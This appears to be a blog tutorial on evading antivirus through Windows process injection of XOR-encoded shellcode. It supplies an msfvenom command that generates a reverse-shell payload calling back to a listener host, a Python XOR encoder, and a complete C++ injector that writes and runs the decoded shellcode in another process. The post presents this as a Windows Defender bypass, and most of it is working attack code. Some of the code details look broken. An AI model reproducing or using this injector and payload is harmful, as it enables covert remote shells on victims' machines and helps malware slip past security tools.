Process Injection - AV Evasion

April 1, 2026
5 min
959 words

Tags: Cprogramming Shellcode Evasion

In the previous posts, we have explored various techniques for process injection, such as using VirtualAllocEx and CreateRemoteThread. However, these methods often require write and execute permissions on the target process, which can trigger antivirus (AV) detection. In this article, we will create shellcode using the Process Injection technique combined with XOR encryption to obfuscate the code and evade antivirus detection. By encrypting our shellcode, we can make it less recognizable to AV software, which often relies on signature-based detection methods.

Below is the process of creating a payload using shellcode in C language, targeting a 64-bit machine.

main.cpp 
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c

XOR Shellcode

To further obfuscate our shellcode, we can use XOR encryption. This involves taking each byte of the shellcode and XORing it with a key. The same key will be used to decrypt the shellcode at runtime before execution.

xor_encrypt.py 
raw_shellcode = "\xaa\xda\xca\[...]\xbe\x14\x49"
enc_shellcode = []
print ("[+] Shellcode is encoding")
for opcode in raw_shellcode:
        enc_opcode = (ord(opcode) ^ 0x41)
        enc_shellcode.append(enc_opcode)

print ("========================Shellcode========================\n\n")
print ("".join(["\\x{0}".format(hex(abs(i)).replace("0x", "")) for i in enc_shellcode]))
print ("\n\n========================Shellcode========================")

After running the above Python script, we will get a new encoded shellcode. We can copy this encoded shellcode and use it in our C code to perform the process injection.

WINAPIs

Our shellcode is ready, so let’s create our process injection binary. But before we move to the next step, let’s have a look at the Windows APIs that we will be using in our code.

OpenProcess

main.cpp 
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId );

We use OpenProcess to open a process by giving the process ID (PID) and desired access rights. Because the main idea of process injection is a create a new allocation space for the shellcode in a local process then write the shellcode in that allocation and execute it so before creating a new allocation into the memory you need to open this process first.

Note: You need to close the opened handle through CloseHandle()

VirtualAllocEx

main.cpp 
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );

We use VirtualAllocEx to allocate a new memory space for my shellcode in anther process. Why we used VirtualAllocEx not VirtualAlloc? Because we need to allocate memory space in another process address space, catch it.

Basically we can use VirtualAlloc for our current process but VirtualAllocEx for another local process.

We going to use CreateRemoteThread to create a thread that runs in the virtual address space of another process and optionally specify extended attributes.

What is the difference between CreateThread and CreateRemoteThread?

  • CreateThread is only allows you to create a thread for the current process.
  • CreateRemoteThread is allows you to create a thread for anther local process.

PWNED

After discussing some WINAPIs we will create our process injection binary that’s bypass the windows defender let’s start with creating our CPP.

There is just one step We would like to discuss it before writing the code which is i will decode the shellcode opcode by opcode.

main.cpp 
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "\x98\xaa\xda\xca\[...]\xbe\x14\x49";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    DWORD oldPerms;
    DWORD PID = 16772; //Change it to target PID
    printf("Injecting to PID: %i", PID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);

    int i;
    int n = 0;
    for (i = 0; i <= sizeof(shellcode); i++) {
        char dec_opcode = shellcode[i] ^ 0x41;
        if (WriteProcessMemory(processHandle, (char*)remoteBuffer + n, &dec_opcode, 1, NULL)) {
            n++;

        }
    }
    VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, &oldPerms);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}
